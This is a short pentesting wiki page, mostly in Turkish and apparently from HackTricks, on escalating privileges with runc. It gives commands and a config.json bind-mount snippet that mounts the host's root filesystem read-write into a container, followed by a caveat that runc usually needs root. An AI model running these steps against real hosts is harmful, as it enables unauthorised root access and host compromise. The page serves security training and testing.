# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

**runc** hakkında daha fazla bilgi edinmek istiyorsanız aşağıdaki sayfaya göz atın:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Host üzerinde `runc` kurulu olduğunu tespit ederseniz, **host'un root / klasörünü mount ederek bir container çalıştırabilirsiniz**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Bu her zaman işe yaramaz; runc'ın varsayılan işlemi root olarak çalıştırmaktır, dolayısıyla bunu ayrıcalıksız bir kullanıcı olarak çalıştırmak, rootless bir yapılandırmanız olmadığı sürece basitçe mümkün değildir. Rootless bir yapılandırmayı varsayılan yapmak genellikle iyi bir fikir değildir; çünkü rootless containers içinde, rootless containers dışında geçerli olmayan pek çok kısıtlama vardır.

{{#include ../../banners/hacktricks-training.md}}
